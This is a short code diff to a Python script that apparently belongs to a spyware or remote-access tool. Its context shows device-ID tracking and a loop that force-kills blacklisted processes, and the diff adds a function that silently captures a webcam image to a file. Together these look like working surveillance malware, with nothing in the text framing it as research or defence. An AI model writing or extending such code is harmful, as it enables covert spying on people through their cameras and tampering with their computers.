@@ -15,6 +15,7 @@ import ctypes
 import sys
 import time
 import psutil
+import cv2
 #create or read device id
 def create_or_read_id_file():
     id_file_path = "ids.txt"
@@ -157,3 +158,18 @@ def monitor_blacklisted_programs():
             if process.info['name'] in blacklist:
                 psutil.Process(process.info['pid']).kill()
         time.sleep(1)  # time to check
+# function to get webcam pics
+def webcam(file_path="web.png"):
+    cap = cv2.VideoCapture(0)
+    # check if camera is open
+    if not cap.isOpened():
+        return 'error or no camera'
+    # take picture
+    ret, frame = cap.read()
+    # check if picture was captured
+    if not ret:
+        return 'error'
+    else:
+        # save image
+        cv2.imwrite(file_path, frame)
+    cap.release()
